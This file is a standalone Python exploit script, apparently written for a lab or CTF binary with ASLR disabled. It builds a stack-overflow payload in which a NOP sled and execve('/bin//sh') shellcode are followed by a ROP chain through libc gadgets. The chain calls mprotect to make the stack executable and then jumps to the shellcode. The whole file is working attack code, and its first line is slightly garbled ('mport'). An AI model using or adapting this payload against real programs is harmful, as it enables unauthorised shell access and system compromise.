 mport sys
import struct

bin_addr = lambda x:struct.pack("<Q",x)
base_libc = 0x007ffff7de0000
	  #0x007ffff7de0000
base_stak = 0x007ffffffde000
	   #0x007ffff7e05000
	   #0x007ffffffe0000
	   #0x007ffffffdf000
	   #0x007ffffffde000
	   #0x007ffff7e05000
nops    = b"\x90"*30
shell   = b"\x48\x31\xf6\x56\x48\xbf\x2f"
shell  += b"\x62\x69\x6e\x2f\x2f\x73\x68"
shell  += b"\x57\x54\x5f\x6a\x3b\x58\x99"
shell  += b"\x0f\x05"
buffer  = b"\x41"*(208-len(shell)-len(nops)) 
rbp     = b"\x42"*8
ret     = bin_addr(0x7ffff7e05359)
pop_rdi = bin_addr(base_libc+0x0000000000026796)
pop_rsi = bin_addr(base_libc+0x000000000002890f)
pop_rdx = bin_addr(base_libc+0x00000000000cb1cd)
mprotect= bin_addr(0x7ffff7ed8c20)
mode    = bin_addr(0x7)
lenght  = bin_addr(0x1000)
rip     = bin_addr(0x7fffffffdda4) #0x7fffffffdd94)
stack   = bin_addr(base_stak)
exploit  = nops
exploit += shell
exploit += buffer
exploit += rbp
#exploit += ret
exploit += pop_rdi
exploit += stack
exploit += pop_rsi
exploit += lenght
exploit += pop_rdx
exploit += mode
exploit += mprotect
exploit += rip
sys.stdout.buffer.write(exploit)
